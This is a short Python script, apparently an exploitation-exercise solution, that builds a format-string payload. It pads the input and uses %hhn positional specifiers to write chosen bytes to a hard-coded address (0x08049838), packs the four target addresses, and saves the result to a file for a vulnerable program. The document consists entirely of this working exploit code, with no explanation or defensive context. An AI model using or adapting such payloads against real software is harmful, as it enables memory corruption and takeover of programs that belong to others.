import struct

# Assume these values are found through your analysis

var_address = 0x08049838

# Create the payload
#payload = b" " * (0xa4 + 28) 
payload = b" " * 0x4
payload += b"%54$hhn"
payload += b" " * (0x8 - 0x4)
payload += b"%55$hhn"
payload += b" " * (0x84 - 0x8)
payload += b"%53$hhn"
payload += b" " * (0xa4 - 0x84)
payload += b"%52$hhn"
payload += struct.pack('I', var_address)
payload += struct.pack('I', var_address + 1)
payload += struct.pack('I', var_address + 2)
payload += struct.pack('I', var_address + 3)

# Save the payload to a file or pass it directly to the vulnerable program
with open('payload', 'wb') as f:
    f.write(payload)
